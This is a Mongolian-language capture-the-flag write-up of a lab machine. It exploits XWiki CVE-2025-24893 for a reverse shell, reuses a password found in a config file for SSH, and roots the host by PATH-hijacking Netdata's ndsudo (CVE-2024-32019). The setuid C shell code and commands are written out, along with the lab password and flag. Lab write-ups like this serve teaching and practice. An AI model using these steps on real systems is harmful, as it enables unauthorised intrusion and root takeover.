XWiki-ийн CVE-2025–24893 сул талыг ашиглан xwiki хэрэглэгчийн shell авснаар олсон. Дараа нь илрүүлсэн misconfigured Netdata ndsudo плагин нь CVE-2024–32019-д эмзэг байсан тул root руу дээшлэх боломж олгосон.

<img width="853" height="437" alt="Screenshot 2025-09-26 131111" src="https://github.com/user-attachments/assets/7b4b20c0-f79f-4e92-84d8-4848350ec05d" />

Сканны үр дүнгээс илэрсэн зүйлс:

22/tcp — OpenSSH 8.9p1 (Ubuntu)

80/tcp — nginx 1.18.0, http://editor.htb/
 руу redirect хийдэг

8080/tcp — Jetty 10.0.20 дээр XWiki ажиллаж байгаа

<img width="954" height="869" alt="Screenshot 2025-09-26 131133" src="https://github.com/user-attachments/assets/ddbd5a0e-d88e-4e24-be6f-30ef0030db75" />

8080 порт дээрх XWiki-ийг нээж үзээд доод хэсэгт нь хувилбарыг олсон:

XWiki Version: 15.10.8

XWiki 15.10.8 нь CVE-2025–24893-д өртөмтгий.Энэ эмзэг байдал нь authenticated нэвтрэлттэй RCE (remote code execution) хийх боломж олгодог.

Эксплойт репог clone хийн, reverse shell payload бэлтгэв:

git clone https://github.com/gunzf0x/CVE-2025-24893
cd CVE-2025-24893


<img width="885" height="255" alt="Screenshot 2025-09-26 135335" src="https://github.com/user-attachments/assets/0c3f7adf-113f-4db7-b48c-ac4362f5d2ff" />

эксплойтийг target руу чиглүүлэн, өөрийн машин дээр буцаж холбогдох shell хүсэлт илгээв:


<img width="771" height="188" alt="Screenshot 2025-09-26 135357" src="https://github.com/user-attachments/assets/8b07e452-2325-4fba-8110-955d23ffe4e6" />

Өөрийн машинууд дээр Netcat listener эхлүүлэв:

<img width="523" height="187" alt="Screenshot 2025-09-26 135501" src="https://github.com/user-attachments/assets/a15d25d2-5c6b-4df5-b87e-f1094099bfca" />

Холболт амжилттай болж, xwiki хэрэглэгчийн shell авсан.

<img width="945" height="268" alt="Screenshot 2025-09-26 135634" src="https://github.com/user-attachments/assets/8c9b424c-65f7-4f10-8587-66d6a4f73cce" />

хадгалагдсан нууц үг хайж эхлэв. XWiki тохиргооны файлуудаас (hibernate.cfg.xml) нууц үгийг олсон:
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
Энэ нь theEd1t0rTeam99 нууц үг oliver хэрэглэгчид ашиглаж болохыг заасан.


<img width="959" height="570" alt="Screenshot 2025-09-26 135725" src="https://github.com/user-attachments/assets/d46b3d08-1b6c-4155-b487-71828078db48" />

XWiki тохиргооноос олсон нууцаар oliver-д SSH хийх боломжтой болсон:

<img width="509" height="167" alt="Screenshot 2025-09-26 135751" src="https://github.com/user-attachments/assets/21e95da1-0ea0-466e-ae61-150118a0e27d" />

ls
Output: user.txt

cat user.txt



<img width="818" height="532" alt="Screenshot 2025-09-26 135843" src="https://github.com/user-attachments/assets/d98e6da2-7266-48e4-8f70-479254b4fb5f" />

Систем дээр privilege escalation боломжуудыг хайж байхдаа SUID биттэй файлуудыг шалгасан:

find / -type f -perm -4000 -user root 2>/dev/null


Үүний үр дүнд Netdata плагин болох дараах файл илэрсэн:

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo


Энэ нь CVE-2024–32019-д эмзэг бөгөөд root-аар arbitrary код гүйцэтгэх боломж олгодог.

Эксплойт хийх

Өөрийн локал машин дээр энгийн C эксплойт бэлтгэсэн:

exploit.c агуулга:

#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}


Компиляц:

gcc exploit.c -o nvme


Binary-г target руу шилжүүлэв:

scp nvme oliver@editor.htb:/tmp

<img width="634" height="361" alt="Screenshot 2025-09-26 142201" src="https://github.com/user-attachments/assets/3584992f-b40c-4ad2-a623-818e5b71ea00" />

Тarget дээр гүйцэтгэх

Тarget дээр дараах алхмуудыг хийж, эксплойтийг ажиллуулсан:

cd /tmp
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

Root нэвтрэлт & Flag

cat /root/root.txt
# Output: 6d4d6c2368c3210994e624647c93119f







